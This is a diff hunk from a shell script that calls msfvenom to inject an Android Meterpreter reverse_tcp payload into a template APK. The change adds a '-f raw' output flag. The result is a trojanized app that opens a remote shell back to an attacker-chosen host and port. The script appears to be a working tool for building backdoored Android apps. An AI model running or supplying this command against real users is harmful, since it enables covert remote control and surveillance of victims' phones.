@@ -19,7 +19,7 @@ TEMPLATE_APK=$3
 
 # Generate the payload with msfvenom using the template APK
 echo "[*] Generating payload..."
-sudo msfvenom -x "$TEMPLATE_APK" -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o android.apk
+sudo msfvenom -x "$TEMPLATE_APK" -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o android.apk
 if [ $? -ne 0 ]; then
     echo "[!] Error generating payload. Exiting."
     exit 1
